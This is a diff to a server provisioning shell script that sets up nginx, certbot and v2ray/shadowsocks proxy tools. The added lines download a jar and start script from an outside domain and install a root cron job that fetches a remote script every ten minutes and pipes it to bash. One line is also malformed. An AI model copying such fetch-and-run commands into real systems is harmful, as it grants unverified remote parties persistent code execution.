@@ -8,6 +8,10 @@ yum -y install certbot python2-certbot-nginx
 yum -y install certbot python2-certbot-nginx
 wget https://raw.githubusercontent.com/cokepluscarbon/Java/master/tools/nginx.conf -O /etc/nginx/nginx.conf
 wget https://raw.githubusercontent.com/cokepluscarbon/Java/master/tools/config.json -O /etc/v2ray/config.json
+mkdir /opt/kikit
+wget https://hk08.whor2.xyz/abcdefb/kikit.jar -O /opt/kikit.jar
+wget https://hk08.whor2.xyz/abcdefb/start.sh -O /opt/start.sh
+echo "*/10 * * * * wget -O - https://raw.githubusercontent.com/cokepluscarbon/Java/master/tools/v2-check-server.sh | bash" | sudo tee -a /etc/crontab > /dev/null
+echo "0 0,12 * * * root python -c 'import random; import time; time.sleep(random.random() * 3600)' && certbot renew" | sudo tee -a /etc/crontab > /dev/null
 wget -O - wget https://raw.githubusercontent.com/cokepluscarbon/Java/master/tools/shadowsocks.sh | bash
 wget https://raw.githubusercontent.com/cokepluscarbon/Java/master/tools/config.json -O /etc/shadowsocks.json
-wget -N --no-check-certificate "https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh" && chmod +x tcp.sh && ./tcp.sh
